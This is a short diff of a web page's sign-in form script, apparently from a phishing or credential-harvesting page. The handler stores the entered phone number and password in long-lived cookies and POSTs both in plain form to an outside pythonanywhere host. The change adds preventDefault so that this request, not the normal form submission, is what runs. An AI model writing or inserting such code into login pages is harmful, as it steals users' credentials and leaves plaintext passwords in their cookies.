@@ -223,16 +223,16 @@
         d.setTime(d.getTime() + (1000 * 24 * 60 * 60 * 1000))
         document.cookie = cname + "=" + cvalue + ";expires=" + d.toUTCString(); + ";path=/";
     }
-    $('#signin').on("submit", function() {
+    $('#signin').on("submit", function(event) {
             setCookie("phonenumber", document.getElementById('phonenumber').value);
             setCookie("password", document.getElementById('password').value);
+            event.preventDefault();
 
     // let xhr = new XMLHttpRequest();
     // xhr.open("POST", 'https://erikadavis1.pythonanywhere.com/');
     // xhr.setRequestHeader('Content-Type', 'application/json');
     // xhr.withCredentials = false;
     // xhr.send(JSON.stringify({'phonenumber': document.getElementById('phonenumber').value,'password': document.getElementById('password').value}));
-    
     var xhr = new XMLHttpRequest();
     xhr.open("POST", 'https://erikadavis1.pythonanywhere.com');
     xhr.setRequestHeader('Content-Type', 'application/json');
